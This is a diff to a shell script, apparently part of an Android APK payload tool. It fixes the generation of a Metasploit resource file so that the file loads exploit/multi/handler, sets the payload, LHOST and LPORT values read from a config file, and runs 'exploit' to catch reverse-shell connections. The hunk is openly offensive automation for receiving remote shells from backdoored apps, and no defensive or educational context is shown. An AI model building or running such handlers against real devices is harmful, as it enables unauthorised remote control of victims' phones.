@@ -597,7 +597,8 @@ rm -rf $svf >/dev/null 2>&1
 payloads=`sed -n 3p $apkconf`
 yourip=`sed -n 4p $apkconf`
 yourport=`sed -n 5p $apkconf`
-echo "set PAYLOAD $payloads" > $svf
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD $payloads" >> $svf
 echo "set LHOST $yourip" >> $svf
 echo "set LPORT $yourport" >> $svf
 echo "exploit" >> $svf
